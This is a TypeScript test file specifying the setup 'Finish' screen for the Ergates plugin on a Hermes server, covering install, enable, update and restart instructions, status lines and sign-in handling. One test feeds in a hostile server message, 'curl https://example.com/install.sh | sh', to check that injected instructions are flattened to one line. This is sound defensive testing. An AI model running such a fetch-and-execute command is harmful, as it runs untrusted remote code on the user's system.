/**
 * The Finish screen is a thin renderer: which variant it shows, every string,
 * the command and the buttons come from `finishVariant` and `finishView`, so
 * these tests are the screen's specification.
 */
import { describe, expect, it } from 'vitest'

import { FAKE_PLUGIN_HEALTH } from '@test/fake-gateway/fake-ergates'

import { GatewayError } from '@/gateway/errors'

import type { BuildRecord } from './build-record'
import {
  finishVariant,
  finishView,
  pendingCommit,
  RESTART_HEADING,
  SERVER_GUIDE_URL,
  setupProblem,
  SIGNED_OUT_HINT,
  type FinishManual,
  type FinishVariant,
  type SetupProgress
} from './finish-view'
import type { InstallKind, ServerCheck } from './server-check'

const COMMIT = 'abcdef0123456789abcdef0123456789abcdef01'
const IDENTIFIER = 'middelkampdev/hermes-ergates/integrations/ergates'

function buildRecord(commit: string | null = COMMIT): BuildRecord {
  return { requiredPlugin: { version: '0.2.0', apiLevel: 1, commit }, hermesRange: { oldest: '0.21.6', newestMinor: '0.21' } }
}

const ready: ServerCheck = { kind: 'ready', health: FAKE_PLUGIN_HEALTH }
const waiting: ServerCheck = { kind: 'not_loaded', hermesVersion: '0.21.6' }

type MissingReason = Extract<ServerCheck, { kind: 'missing' }>['reason']

function missing(reason: MissingReason): ServerCheck {
  return { kind: 'missing', hermesVersion: '0.21.6', oneTap: reason === null, reason }
}

function outdated(installKind: InstallKind): ServerCheck {
  return { kind: 'outdated', health: FAKE_PLUGIN_HEALTH, installKind, hermesVersion: '0.21.6' }
}

const install = (extra: Partial<Extract<FinishVariant, { kind: 'install' }>> = {}): FinishVariant => ({ kind: 'install', restart: false, failure: null, detail: null, ...extra })

const RESTART_LINES = [
  'Hermes service: systemctl --user restart hermes-dashboard',
  'Docker: docker restart <container name>',
  'Hermes Desktop: quit it and open it again',
  'Started by hand: stop hermes serve and start it again'
]
const RUN_INTRO = 'On your server, as the user that runs Hermes, run:'

describe('finishVariant: what the check says the user has to do', () => {
  it.each<[string, MissingReason, boolean]>([
    ['in the tested range', null, false],
    ['newer than the tested range', 'untested', false],
    ['a build without a commit', 'no_commit', false],
    ['older than the oldest supported', 'too_old', true],
    ['a version the app cannot read', 'unknown', true]
  ])('installs by hand on a missing plugin on a Hermes %s, with a restart: %s', (_title, reason, restart) => {
    expect(finishVariant(missing(reason), null)).toEqual({ kind: 'install', restart, failure: null, detail: null })
  })

  it('keeps the failure Hermes gave and still asks for the restart an old Hermes needs', () => {
    const manual: FinishManual = { failure: 'refused', detail: 'Plugin blocked by policy' }

    expect(finishVariant(missing('too_old'), manual)).toEqual({ kind: 'install', restart: true, failure: 'refused', detail: 'Plugin blocked by policy' })
    expect(finishVariant(missing(null), manual)).toEqual({ kind: 'install', restart: false, failure: 'refused', detail: 'Plugin blocked by policy' })
  })

  it('turns the plugin on by hand when Hermes refused to enable it, where the server lists it turned off', () => {
    const manual: FinishManual = { failure: 'enable_refused', detail: 'enable refused: no' }

    expect(finishVariant({ kind: 'disabled', hermesVersion: '0.21.6' }, manual)).toEqual({ kind: 'enable', detail: 'enable refused: no' })
  })

  it('knows a refused enable before the first check has answered, because the plugin is on the server then', () => {
    expect(finishVariant(null, { failure: 'enable_refused', detail: null })).toEqual({ kind: 'enable', detail: null })
  })

  it('installs a plugin the server does not list, whatever the earlier failure was', () => {
    expect(finishVariant(missing(null), { failure: 'enable_refused', detail: 'enable refused: no' })).toEqual({ kind: 'install', restart: false, failure: 'enable_refused', detail: 'enable refused: no' })
  })

  it('names no variant for a plugin that is turned off after a failure that was not a refused enable', () => {
    expect(finishVariant({ kind: 'disabled', hermesVersion: '0.21.6' }, { failure: 'scan_blocked', detail: null })).toBeNull()
  })

  it('shows the failure from the route before the first check has answered', () => {
    expect(finishVariant(null, { failure: 'no_git', detail: null })).toEqual({ kind: 'install', restart: false, failure: 'no_git', detail: null })
  })

  it('names no variant without a check and without a failure', () => {
    expect(finishVariant(null, null)).toBeNull()
  })

  it('asks for a restart when Hermes has the plugin but has not loaded it', () => {
    expect(finishVariant(waiting, null)).toEqual({ kind: 'restart' })
  })

  it('lets the server win over an old failure once the plugin is installed', () => {
    expect(finishVariant(waiting, { failure: 'scan_blocked', detail: null })).toEqual({ kind: 'restart' })
    expect(finishVariant(outdated('git install'), { failure: 'scan_blocked', detail: null })).toEqual({ kind: 'update' })
  })

  it.each<[InstallKind, FinishVariant]>([
    ['git install', { kind: 'update' }],
    ['manual copy', { kind: 'update_copy' }],
    ['deployment', { kind: 'deployment' }]
  ])('updates an outdated %s the way that kind of install is updated', (installKind, expected) => {
    expect(finishVariant(outdated(installKind), null)).toEqual(expected)
  })

  it.each<[string, ServerCheck]>([
    ['ready', ready],
    ['unknown', { kind: 'unknown' }],
    ['unavailable', { kind: 'unavailable', message: 'The store is busy.' }],
    ['app_outdated', { kind: 'app_outdated', health: FAKE_PLUGIN_HEALTH }],
    ['disabled', { kind: 'disabled', hermesVersion: '0.21.6' }]
  ])('names no variant for a %s check, so the screen keeps the one it had', (_title, check) => {
    expect(finishVariant(check, null)).toBeNull()
  })

  it('does not let a failure from the route replace the variant while the server cannot be reached or is ready', () => {
    const manual: FinishManual = { failure: 'refused', detail: null }

    expect(finishVariant({ kind: 'unknown' }, manual)).toBeNull()
    expect(finishVariant(ready, manual)).toBeNull()
  })
})

describe('finishView: the instructions for each variant', () => {
  it('shows the install command with the full commit and the guide for the manual steps', () => {
    const view = finishView(install(), buildRecord(), waiting)

    expect(view).toEqual({
      title: 'Finish on your server',
      intro: [RUN_INTRO],
      command: `hermes plugins install ${IDENTIFIER} --ref ${COMMIT} --enable`,
      restartLines: null,
      guide: { label: 'Open the guide', url: `${SERVER_GUIDE_URL}#manual` },
      status: 'Waiting for your server…',
      done: false,
      primary: { label: 'Check now', action: 'check' }
    })
    expect(view.command).toContain(COMMIT)
  })

  it('adds the restart lines to an install on a Hermes that does not load the plugin by itself', () => {
    const view = finishView(install({ restart: true }), buildRecord(), waiting)

    expect(view.restartLines).toEqual(RESTART_LINES)
    expect(RESTART_HEADING).toBe('Then restart Hermes:')
  })

  it('moves the pin of a git install with --force before --ref, and asks for the restart', () => {
    const view = finishView({ kind: 'update' }, buildRecord(), waiting)

    expect(view.title).toBe('Finish on your server')
    expect(view.intro).toEqual([RUN_INTRO])
    expect(view.command).toBe(`hermes plugins install ${IDENTIFIER} --force --ref ${COMMIT} --enable`)
    expect(view.restartLines).toEqual(RESTART_LINES)
    expect(view.guide).toEqual({ label: 'Open the guide', url: `${SERVER_GUIDE_URL}#manual` })
  })

  it('tells a manual copy to update its own folder to the version of this build, with no command', () => {
    const view = finishView({ kind: 'update_copy' }, buildRecord(), waiting)

    expect(view.intro).toEqual(['Update the folder you copied or linked the plugin from to version 0.2.0, then restart Hermes.'])
    expect(view.command).toBeNull()
    expect(view.restartLines).toEqual(RESTART_LINES)
    expect(view.guide.url).toBe(`${SERVER_GUIDE_URL}#manual`)
  })

  it('asks for a restart when Hermes has not loaded the plugin, with no command', () => {
    const view = finishView({ kind: 'restart' }, buildRecord(), waiting)

    expect(view.title).toBe('Finish on your server')
    expect(view.intro).toEqual(['Hermes has not loaded the Ergates plugin yet.'])
    expect(view.command).toBeNull()
    expect(view.restartLines).toEqual(RESTART_LINES)
    expect(view.guide).toEqual({ label: 'Open the guide', url: `${SERVER_GUIDE_URL}#restart` })
  })

  it('sends a deployment to update the deployment, with no command and no restart lines', () => {
    const view = finishView({ kind: 'deployment' }, buildRecord(), outdated('deployment'))

    expect(view.title).toBe('Update your Ergates deployment')
    expect(view.intro).toEqual(['This server runs the Ergates deployment, which brings its own plugin. Update the deployment to get plugin 0.2.0.'])
    expect(view.command).toBeNull()
    expect(view.restartLines).toBeNull()
    expect(view.guide).toEqual({ label: 'Open the guide', url: `${SERVER_GUIDE_URL}#deployment` })
  })

  it.each<[string, FinishVariant]>([
    ['an install', install()],
    ['an install on an old Hermes', install({ restart: true })],
    ['an update', { kind: 'update' }]
  ])('shows no command and no restart lines for %s from a build without a commit, only the intro and the guide', (_title, variant) => {
    const view = finishView(variant, buildRecord(null), waiting)

    expect(view.command).toBeNull()
    expect(view.restartLines).toBeNull()
    expect(view.intro).toEqual([RUN_INTRO])
    expect(view.guide.url).toBe(`${SERVER_GUIDE_URL}#manual`)
    expect(view.status).toBe('Waiting for your server…')
  })

  it('shows no command without a build record, and names no version it does not know', () => {
    expect(finishView(install(), null, waiting).command).toBeNull()
    expect(finishView({ kind: 'update' }, null, waiting).restartLines).toBeNull()
    expect(finishView({ kind: 'update_copy' }, null, waiting).intro).toEqual(['Update the folder you copied or linked the plugin from to the newest version, then restart Hermes.'])
    expect(finishView({ kind: 'deployment' }, null, waiting).intro).toEqual(['This server runs the Ergates deployment, which brings its own plugin. Update the deployment to get the newest plugin.'])
  })
})

describe('finishView: why the install is by hand', () => {
  it.each<[string, FinishVariant, string]>([
    ['scan_blocked', install({ failure: 'scan_blocked' }), "Hermes's security check stopped the install. Run the command to see the findings."],
    ['no_git', install({ failure: 'no_git' }), 'Your server has no Git, which Hermes needs to install plugins. Install Git first.'],
    ['download_failed', install({ failure: 'download_failed' }), 'Your server could not download the plugin from GitHub.'],
    ['enable_refused', install({ failure: 'enable_refused', detail: 'enable refused: not allowed' }), 'Hermes refused the install: enable refused: not allowed'],
    ['refused', install({ failure: 'refused', detail: 'Plugin blocked by policy' }), 'Hermes refused the install: Plugin blocked by policy']
  ])('puts the reason for %s above the command', (_code, variant, reason) => {
    const view = finishView(variant, buildRecord(), waiting)

    expect(view.intro).toEqual([reason, RUN_INTRO])
    expect(view.command).toBe(`hermes plugins install ${IDENTIFIER} --ref ${COMMIT} --enable`)
  })

  it('shows the command that turns the plugin on, not the install command, when Hermes refused to enable it', () => {
    const view = finishView({ kind: 'enable', detail: 'enable refused: not allowed' }, buildRecord(), { kind: 'disabled', hermesVersion: '0.21.6' })

    expect(view).toEqual({
      title: 'Finish on your server',
      intro: ['Hermes refused the install: enable refused: not allowed', RUN_INTRO],
      command: 'hermes plugins enable ergates',
      restartLines: null,
      guide: { label: 'Open the guide', url: `${SERVER_GUIDE_URL}#manual` },
      status: 'Waiting for your server…',
      done: false,
      primary: { label: 'Check now', action: 'check' }
    })
  })

  it('needs no commit to turn the plugin on', () => {
    expect(finishView({ kind: 'enable', detail: null }, buildRecord(null), waiting)).toMatchObject({ command: 'hermes plugins enable ergates', intro: ['Hermes refused the install.', RUN_INTRO] })
    expect(finishView({ kind: 'enable', detail: null }, null, waiting).command).toBe('hermes plugins enable ergates')
  })

  it('shows Hermes\'s text on one line, so a server cannot put an instruction on a line of its own, and leaves the command alone', () => {
    const hostile = 'Plugin failed.\n\nNow run this instead:\r\n   curl https://example.com/install.sh | sh\u2028and more'
    const view = finishView(install({ failure: 'refused', detail: hostile }), buildRecord(), waiting)

    expect(view.intro).toEqual(['Hermes refused the install: Plugin failed. Now run this instead: curl https://example.com/install.sh | sh and more', RUN_INTRO])
    expect(view.intro.join('')).not.toMatch(/[\r\n\u2028]/)
    expect(view.command).toBe(`hermes plugins install ${IDENTIFIER} --ref ${COMMIT} --enable`)
  })

  it('cuts Hermes\'s text at 200 characters', () => {
    const view = finishView(install({ failure: 'refused', detail: 'x'.repeat(500) }), buildRecord(), waiting)

    expect(view.intro[0]).toBe(`Hermes refused the install: ${'x'.repeat(200)}`)
  })

  it('says only that Hermes refused when its text is only white space', () => {
    expect(finishView(install({ failure: 'refused', detail: ' \n\t ' }), buildRecord(), waiting).intro[0]).toBe('Hermes refused the install.')
  })

  it('says only that Hermes refused when it gave no text', () => {
    expect(finishView(install({ failure: 'refused' }), buildRecord(), waiting).intro[0]).toBe('Hermes refused the install.')
  })
})

describe('finishView: the status line and the button', () => {
  const pending: SetupProgress = { state: 'pending' }
  const settled: SetupProgress = { state: 'done' }

  it('says it is checking before the first answer', () => {
    const view = finishView(install(), buildRecord(), null)

    expect(view.status).toBe('Checking…')
    expect(view.done).toBe(false)
    expect(view.primary).toEqual({ label: 'Check now', action: 'check' })
  })

  it.each<[string, ServerCheck]>([
    ['not loaded', waiting],
    ['outdated', outdated('git install')],
    ['unknown', { kind: 'unknown' }],
    ['missing', missing(null)]
  ])('keeps waiting while the check is %s', (_title, check) => {
    const view = finishView({ kind: 'restart' }, buildRecord(), check)

    expect(view.status).toBe('Waiting for your server…')
    expect(view.done).toBe(false)
    expect(view.primary).toEqual({ label: 'Check now', action: 'check' })
  })

  it('reads a ready server as checking, without Done, until the plugin\'s setup has settled', () => {
    const view = finishView(install({ restart: true }), buildRecord(), ready, pending)

    expect(view).toMatchObject({ status: 'Checking…', done: false, primary: { label: 'Check now', action: 'check' }, intro: [], command: null, restartLines: null })
  })

  it('reads a ready server as checking when no setup state is given', () => {
    expect(finishView({ kind: 'restart' }, buildRecord(), ready)).toMatchObject({ status: 'Checking…', done: false })
  })

  it('says the server is ready and leaves with Done once the setup has settled, without the instructions it no longer needs', () => {
    const view = finishView(install({ restart: true }), buildRecord(), ready, settled)

    expect(view).toMatchObject({ status: 'Your server is ready.', done: true, primary: { label: 'Done', action: 'done' }, intro: [], command: null, restartLines: null })
  })

  it.each<[string, ServerCheck | 'sign_in' | null]>([
    ['no check', null],
    ['a server that is waiting again', waiting],
    ['a check that could not tell', { kind: 'unknown' }],
    ['a refused session', 'sign_in']
  ])('stays done whatever a later check says: %s', (_title, check) => {
    const view = finishView({ kind: 'restart' }, buildRecord(), check, settled)

    expect(view).toMatchObject({ status: 'Your server is ready.', done: true, primary: { label: 'Done', action: 'done' }, intro: [], command: null, restartLines: null })
  })

  it('keeps the title of the variant it had when the setup is done', () => {
    expect(finishView({ kind: 'deployment' }, buildRecord(), ready, settled).title).toBe('Update your Ergates deployment')
  })

  it('shows what went wrong with the setup of a ready server, and waits for the next check to try again', () => {
    const view = finishView({ kind: 'restart' }, buildRecord(), ready, { state: 'failed', message: 'The plugin could not set up your agents.' })

    expect(view.status).toBe('The plugin could not set up your agents.')
    expect(view.done).toBe(false)
    expect(view.primary).toEqual({ label: 'Check now', action: 'check' })
  })

  it('ignores a setup problem while the server is not ready', () => {
    expect(finishView({ kind: 'restart' }, buildRecord(), waiting, { state: 'failed', message: 'Old problem' }).status).toBe('Waiting for your server…')
  })

  it('asks to sign in again after a restart, with the way to stay signed in', () => {
    const view = finishView({ kind: 'restart' }, buildRecord(), 'sign_in')

    expect(view.status).toBe(`Your server restarted. Sign in again to continue. ${SIGNED_OUT_HINT.text}`)
    expect(view.guide).toEqual({ label: 'How to stay signed in', url: `${SERVER_GUIDE_URL}#stay-signed-in` })
    expect(view.done).toBe(false)
    expect(view.primary).toEqual({ label: 'Sign in again', action: 'sign_in' })
    expect(view).toMatchObject({ intro: [], command: null, restartLines: null })
  })

  it('asks to sign in again before any variant is known', () => {
    const view = finishView(null, buildRecord(), 'sign_in')

    expect(view.title).toBe('Finish on your server')
    expect(view.primary.action).toBe('sign_in')
    expect(view.guide.url).toBe(SIGNED_OUT_HINT.url)
  })

  it('lets a sign-in win over a setup problem', () => {
    expect(finishView({ kind: 'restart' }, buildRecord(), 'sign_in', { state: 'failed', message: 'A problem' }).status).toContain('Sign in again to continue.')
  })

  it('shows only the title, the status and the guide before a variant is known', () => {
    expect(finishView(null, buildRecord(), null)).toEqual({
      title: 'Finish on your server',
      intro: [],
      command: null,
      restartLines: null,
      guide: { label: 'Open the guide', url: SERVER_GUIDE_URL },
      status: 'Checking…',
      done: false,
      primary: { label: 'Check now', action: 'check' }
    })
  })
})

describe('SIGNED_OUT_HINT: the sentence the sign-in screen shows too', () => {
  it('says why Hermes signs the user out and links to the guide for staying signed in', () => {
    expect(SIGNED_OUT_HINT).toEqual({
      text: 'Hermes signs you out when it restarts, unless your server has a fixed sign-in secret.',
      label: 'How to stay signed in',
      url: 'https://middelkamp.dev/ergates/server/#stay-signed-in'
    })
  })
})

describe('pendingCommit: when the screen records that the plugin is still to be set up', () => {
  it.each<[string, ServerCheck]>([
    ['a missing plugin', missing(null)],
    ['a missing plugin on a Hermes outside the tested range', missing('untested')],
    ['a plugin that is turned off', { kind: 'disabled', hermesVersion: '0.21.6' }],
    ['an outdated git install', outdated('git install')],
    ['an outdated manual copy', outdated('manual copy')]
  ])('records the commit of this build once the server answered with %s', (_title, check) => {
    expect(pendingCommit(check, buildRecord())).toBe(COMMIT)
  })

  it.each<[string, ServerCheck | null]>([
    ['no answer yet', null],
    ['a plugin Hermes has not loaded', waiting],
    ['an outdated deployment', outdated('deployment')],
    ['a ready plugin', ready],
    ['a check that could not tell', { kind: 'unknown' }],
    ['an unavailable plugin', { kind: 'unavailable', message: 'The store is busy.' }],
    ['a plugin newer than the app', { kind: 'app_outdated', health: FAKE_PLUGIN_HEALTH }]
  ])('records nothing for %s', (_title, check) => {
    expect(pendingCommit(check, buildRecord())).toBeNull()
  })

  it('records nothing without a commit', () => {
    expect(pendingCommit(missing(null), buildRecord(null))).toBeNull()
    expect(pendingCommit(missing(null), null)).toBeNull()
  })
})

describe('setupProblem: what a failed plugin setup shows', () => {
  it('shows the message of a gateway error, which carries no secrets', () => {
    expect(setupProblem(new GatewayError('network', 'Could not reach the gateway.'))).toBe('Could not reach the gateway.')
  })

  it('shows a plain sentence for an error from elsewhere', () => {
    expect(setupProblem(new Error('boom'))).toBe('Could not set up your agents.')
  })
})
